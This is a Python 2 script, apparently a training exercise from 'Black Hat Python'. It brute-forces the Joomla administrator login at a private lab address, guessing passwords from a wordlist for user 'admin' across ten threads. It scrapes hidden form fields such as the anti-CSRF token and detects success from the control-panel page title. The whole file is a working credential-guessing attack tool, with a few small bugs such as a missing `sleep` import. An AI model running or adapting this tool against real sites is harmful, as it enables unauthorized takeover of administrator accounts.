#!/usr/bin/python

import urllib2, urllib, cookielib, threading, sys, Queue
from HTMLParser import HTMLParser

# general settings
user_thread = 10
username = "admin"
wordlist_file = "/home/taishi/blackhat_python/web/sample.txt"
resume = None

# target specific settings
target_url = "http://192.168.2.4/joomla/administrator/index.php"  # target of the brute-force
target_post = "http://192.168.2.4/joomla/administrator/index.php"

# from HTML elements
username_field = "username"
password_field = "passwd"

# string that would be checked for after each brute-forcing attempt to determine whether successful
success_check = "Administration - Control Panel"


class BruteParser(HTMLParser):
    """Parser for this brute-force"""
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value  in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value

            if tag_name is not None:
                self.tag_results[tag_name] = value

class Bruter(object):
    """Primary brute-forcing class for joomla"""
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False
        print "Finished setting up for: %s" % username

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))

            response = opener.open(target_url)

            page = response.read()

            print "Trying: %s : %s (%d left)" % (self.username, brute, self.password_q.qsize())

            # parse out the hidden fields
            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            # add our username and password fields
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(target_post, login_data)

            login_result = login_response.read()

            if success_check in login_result:
                self.found = True
                print "[*] Bruteforce successful"
                print "[*] Username: %s" % username
                print "[*] Password: %s" % brute
                print "[*] Waiting for other threads to exit..."


def build_wordlist(wordlist_file):
    # read in the word list
    fd = open(wordlist_file, "rb")
    raw_words = fd.readlines()
    fd.close()

    found_resume = False
    words = Queue.Queue()

    for word in raw_words:
        word = word.rstrip()
        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print "Resuming wordlist from: %s" % resume

        else:
            words.put(word)


    return words

if __name__ == '__main__':
    words = build_wordlist(wordlist_file)
    bruter_obj = Bruter(username,words)
    try:
        bruter_obj.run_bruteforce()
    except KeyboardInterrupt:
        bruter_obj.found_resume = True
        sleep(2)
        sys.exit(0)
